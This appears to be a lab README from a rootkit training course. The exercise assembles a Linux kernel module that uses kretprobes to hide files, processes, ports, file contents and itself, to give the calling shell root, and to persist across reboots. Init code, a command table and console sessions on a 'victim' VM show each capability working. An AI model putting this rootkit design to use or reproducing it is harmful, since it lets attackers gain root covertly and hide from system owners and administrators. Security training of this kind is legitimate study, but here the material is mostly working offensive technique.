# M01: Covert Local Control

## Mission

M01 combines the local control mechanisms from L00 through L13, plus the
persistence and module-concealment work from M00.
Each mechanism works alone.
Integration adds:

- Shared state across subsystems
- Registration order dependencies
- Partial-init rollback
- Reverse-order cleanup

A failure in one subsystem must not leave commands or probes owned by another
subsystem registered.

The result is one module with sixteen control commands (plus two agent stubs
registered for L15), four target lists, and seven kretprobes.

## What you will observe

One loaded module accepts the complete symmetric control vocabulary:

```text
rklings.h.f.secret  -- hide file     rklings.u.f.secret  -- restore it
rklings.h.i.1234    -- hide PID      rklings.u.i.1234    -- restore it
rklings.h.p.4444    -- hide port     rklings.u.p.4444    -- restore it
rklings.h.c.token   -- hide lines    rklings.u.c.token   -- restore them
```

## Workspace

```text
exercises/M01-local-control
├── core
│   ├── dispatch.c
│   ├── escalation.c
│   ├── filter.c
│   ├── init.c
│   ├── module.c
│   └── target.c
├── include
│   └── rootkit.h
└── Kbuild
```

Only `core/init.c` is editable:

- The header and `Kbuild` define the shared contract
- The focused mechanisms from L00-L13 and M00 are supplied as complete subsystem
  implementations

| File                | Responsibility                                    |
| ------------------- | ------------------------------------------------- |
| `include/rootkit.h` | Shared types, externs, declarations               |
| `core/init.c`       | module_init/exit, goto chain, ping/status         |
| `core/dispatch.c`   | Command registry, mkdir/mkdirat kretprobes        |
| `core/escalation.c` | Immediate parent-shell and explicit-PID elevation |
| `core/module.c`     | Persistence, module hiding                        |
| `core/target.c`     | Spinlock-protected target list                    |
| `core/filter.c`     | getdents64 + ksys_read + tcp seq_show kretprobes  |

## Architecture

```text
mkdir rklings.h.f.secret
  |
  v
dispatch.c: strip "rklings.", longest-prefix match "h.f"
  |
  v
filter.c: cmd_hide_file("secret") --> rk_target_add(&file_targets, "secret")

ls /tmp
  |
  v
getdents64 kretprobe (filter.c)
  |
  v
walk dirent buffer, rk_target_match each d_name
  |
  v
memmove to remove "secret", copy_to_user, regs_set_return_value
  |
  v
ls shows everything except "secret"
```

## Init ordering

`rk_init` initializes the four target lists, registers commands (table-driven),
loads the `inet_diag` module, then registers probes (loop over array).

The `inet_diag` module provides the `inet_sk_diag_fill` function that `ss` uses
to report sockets via netlink.
Calling `request_module("inet_diag")` before registering the kretprobe ensures
the symbol is available for the probe to hook:

```c
static struct kretprobe *probes[] = {
    &rk_mkdir_probe, &rk_mkdirat_probe,
    &rk_getdents_probe, &rk_read_probe,
    &rk_tcp4_probe, &rk_tcp6_probe,
    &rk_inet_diag_probe,
};
static int nr_probes;

/* initialize target lists */
rk_target_init(&rk_file_targets);
rk_target_init(&rk_pid_targets);
rk_target_init(&rk_content_targets);
rk_target_init(&rk_port_targets);

ret = rk_cmds_register(init_cmds, ARRAY_SIZE(init_cmds));
ret = rk_escalate_init();
ret = rk_module_cmds_init();
ret = rk_filter_init();
/* load inet_diag so the probe symbol exists */
ret = request_module("inet_diag");
for (i = 0; i < ARRAY_SIZE(probes); i++) {
    ret = register_kretprobe(probes[i]);
    if (ret) goto fail_probes;
    nr_probes++;
}

fail_probes:
    while (nr_probes--) unregister_kretprobe(probes[nr_probes]);
```

Exit reverses: unhide the module and unregister probes in reverse.

## Subsystem ownership

Each file registers only its own commands.
No file reaches into another subsystem's state:

| Owner        | Commands                                       |
| ------------ | ---------------------------------------------- |
| init.c       | ping, status, list, quit (agent stubs for L15) |
| escalation.c | e                                              |
| module.c     | persist, unpersist, h.m, u.m                   |
| filter.c     | h.f, u.f, h.i, u.i, h.c, u.c, h.p, u.p         |

## TODOs

```text
TODO 1  core/init.c:57:2  initialize and register everything with rollback
TODO 2  core/init.c:64:2  clean teardown in reverse
```

### TODO 1 -- `core/init.c:57:2` -- Initialize and register everything with rollback

1. Initialize all four target lists with `rk_target_init`.
2. Register command providers in order: `init_cmds`, then `rk_escalate_init`,
   `rk_module_cmds_init`, and `rk_filter_init`.
3. Call `request_module("inet_diag")` so the netlink probe symbol exists.
4. Loop over the `probes` array, calling `register_kretprobe` for each.
   Track `nr_probes` so a failure unwinds only the successfully registered
   prefix.

If any step fails, return the error.
A probe failure must unregister only the probes that succeeded, in reverse.

### TODO 2 -- `core/init.c:64:2` -- Clean teardown in reverse

1. Call `rk_module_unhide()` to restore module visibility.
2. Unregister all registered probes in reverse order.
3. Log the completed unload.

## All 16 mkdir commands

| Command              | Action                                 |
| -------------------- | -------------------------------------- |
| `rklings.e`          | Elevate the shell that invoked `mkdir` |
| `rklings.e.<pid>`    | Elevate the selected PID immediately   |
| `rklings.ping`       | Log pong                               |
| `rklings.status`     | Log state                              |
| `rklings.persist`    | Write /etc/modules-load.d entry        |
| `rklings.unpersist`  | Remove persistence                     |
| `rklings.h.m`        | Hide module from lsmod                 |
| `rklings.u.m`        | Unhide module                          |
| `rklings.h.f.<name>` | Hide file from ls                      |
| `rklings.u.f.<name>` | Unhide file by value                   |
| `rklings.h.i.<pid>`  | Hide PID from ps                       |
| `rklings.u.i.<pid>`  | Unhide PID by value                    |
| `rklings.h.c.<str>`  | Hide lines from reads                  |
| `rklings.u.c.<str>`  | Unhide content by value                |
| `rklings.h.p.<port>` | Hide port from ss                      |
| `rklings.u.p.<port>` | Unhide port by value                   |

## Test it

Boot the target:

```console
$ ./rklings run M01
```

The VM boots as `student`.
Walk each subsystem in order.

### Escalation

```console
student@victim:~$ id
uid=1000(student) gid=1000(student)
student@victim:~$ mkdir rklings.e && id
uid=0(root) gid=0(root)
```

### File hiding

```console
root@victim:~# echo "still here" > /tmp/secret
root@victim:~# mkdir rklings.h.f.secret
root@victim:~# ls /tmp | grep secret
root@victim:~# cat /tmp/secret
still here
root@victim:~# mkdir rklings.u.f.secret
root@victim:~# ls /tmp | grep secret
secret
```

### PID hiding

```console
root@victim:~# sleep 3600 &
[1] 482
root@victim:~# mkdir rklings.h.i.482
root@victim:~# ps -p 482
    PID TTY          TIME CMD
root@victim:~# kill -0 482
root@victim:~# mkdir rklings.u.i.482
root@victim:~# ps -p 482
    PID TTY          TIME CMD
    482 pts/0    00:00:00 sleep
root@victim:~# kill 482
```

### Content hiding

```console
root@victim:~# cat > /tmp/config << 'EOF'
public line
secret_token=abc123
public again
EOF
root@victim:~# mkdir rklings.h.c.secret_token
root@victim:~# cat /tmp/config
public line
public again
root@victim:~# mkdir rklings.u.c.secret_token
root@victim:~# cat /tmp/config
public line
secret_token=abc123
public again
```

### Port hiding

`ss` and `/proc/net/tcp` report ports in hex. 4444 decimal is `115C` hex:

```console
root@victim:~# nc -l -p 4444 &
root@victim:~# ss -tlnp | grep 4444
LISTEN  0  1  0.0.0.0:4444  0.0.0.0:*
root@victim:~# mkdir rklings.h.p.4444
root@victim:~# ss -tlnp | grep 4444
root@victim:~# grep -i ':115C ' /proc/net/tcp
root@victim:~# kill %1
```

### Module hiding and persistence

```console
root@victim:~# lsmod | grep rklings
rklings  16384  0
root@victim:~# mkdir rklings.h.m
root@victim:~# lsmod | grep rklings
root@victim:~# mkdir rklings.persist
root@victim:~# cat /etc/modules-load.d/rklings.conf
rklings
```

### Persistence reboot

Reboot the guest:

```console
root@victim:~# reboot
```

After the guest comes back, confirm the module auto-loaded:

```console
root@victim:~# dmesg | grep rklings
root@victim:~# mkdir rklings.ping
```

## Validate

```console
$ ./rklings validate M01
  [+] All seven kretprobes register successfully
  [+] mkdir rklings.e grants root
  [+] mkdir rklings.h.f hides files
  [+] mkdir rklings.h.i hides PIDs
  [+] mkdir rklings.h.c hides content lines
  [+] mkdir rklings.h.p hides ports
  [+] Module unloads without errors
  PASS
```

## Next

The complete local module works when it is already inside a VM.
D00 starts outside a fresh target and makes you gain access, become root,
transfer the module, and deploy it yourself.
